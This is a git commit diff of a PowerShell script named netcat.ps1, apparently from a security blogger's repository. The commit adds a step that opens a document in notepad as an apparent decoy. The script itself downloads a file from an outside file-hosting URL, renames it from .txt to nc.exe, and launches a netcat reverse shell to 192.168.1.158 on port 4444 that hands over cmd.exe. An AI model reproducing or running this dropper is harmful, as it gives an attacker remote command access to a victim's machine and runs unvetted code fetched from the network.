353787a5a52254350be8ab1eb876e6dffab97750
Securethelogs.com <54673576+securethelogs@users.noreply.github.com>
2020-04-24 14:35:27 +0100

    Update netcat.ps1

--- netcat.ps1
+++ netcat.ps1
@@ -1,7 +1,9 @@
 echo "hi" >> "C:\temp\important_document.txt"
+Start-Process notepad.exe "C:\temp\important_document.txt"
+
 (New-Object net.webclient).DownloadFile('https://www.privfile.com/download.php?fid=5ea2e7a741842-NjQ0', 'C:\seclogs\nc.exe.txt')
 Rename-Item -Path "C:\seclogs\nc.exe.txt" -NewName "C:\seclogs\nc.exe"
 
 Start-Sleep -Seconds 5
 C:\seclogs\nc.exe 192.168.1.158 4444 -e cmd.exe
-notepad.exe "C:\temp\important_document.txt"
+
